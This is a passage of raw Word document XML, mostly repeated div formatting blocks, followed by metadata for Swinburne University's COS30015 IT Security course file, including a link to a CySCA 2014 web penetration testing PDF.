              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="2123915295">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="2124037386">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="2126801634">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="2129398295">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="2132089834">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="2137865533">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="2139715655">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="21433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yberchallenge.com.au/pdf/CySCA2014_Web_Penetration_Testing.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1A361-5DA8-46F3-ACD1-995029ED2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COS30015 IT Security</vt:lpstr>
    </vt:vector>
  </TitlesOfParts>
  <Company>Swinbune University of Technology</Company>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>8757</CharactersWithSpaces>
  <SharedDoc>false</SharedDoc>
  <HLinks>
    <vt:vector size="6" baseType="variant">
      <vt:variant>
        <vt:i4>4522028</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>https://www.cyberchallenge.com.au/pdf/CySCA2014_Web_Penetration_Testing.pdf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COS30015 IT Security</dc:title>
  <dc:subject/>
  <dc:creator>Faculty of ICT</dc:creator>
  <cp:keywords/>
  <cp:lastModifiedBy>Mohammad Faizal Alias</cp:lastModifiedBy>
  <cp:revision>5</cp:revision>
  <cp:lastPrinted>2015-09-21T03:02:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2023-08-13T03:28:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2023-10-10T03:54:00Z</dcterms:modified>
</cp:coreProperties>
</file>